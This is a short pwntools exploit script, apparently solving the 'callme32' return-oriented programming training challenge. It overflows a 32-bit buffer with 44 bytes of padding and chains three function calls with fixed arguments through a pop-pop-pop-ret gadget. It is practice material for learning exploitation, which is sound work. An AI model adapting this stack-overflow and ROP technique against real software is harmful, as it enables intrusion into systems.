# t0 - 2025
from pwn import *

context(arch='i386', os='linux')
context.binary = "./callme32"
#p = process('./callme32')

p = gdb.debug(context.binary.path, '''
    b main
    continue
''')

callme_one = p32(0x80484f0)
callme_two = p32(0x8048550)
callme_three = p32(0x80484e0)
pppr = p32(0x080487f9) # pop pop pop ret to clean up arguments 
arg1 = p32(0xdeadbeef)
arg2 = p32(0xcafebabe)
arg3 = p32(0xd00df00d)


padding = "A"*44
padding = padding.encode('ascii')
payload = padding + callme_one + pppr +  arg1 + arg2 + arg3 + callme_two + pppr + arg1 + arg2 + arg3 + callme_three + pppr + arg1 + arg2 + arg3
p.recvuntil("> ")
p.send(payload)
p.interactive()
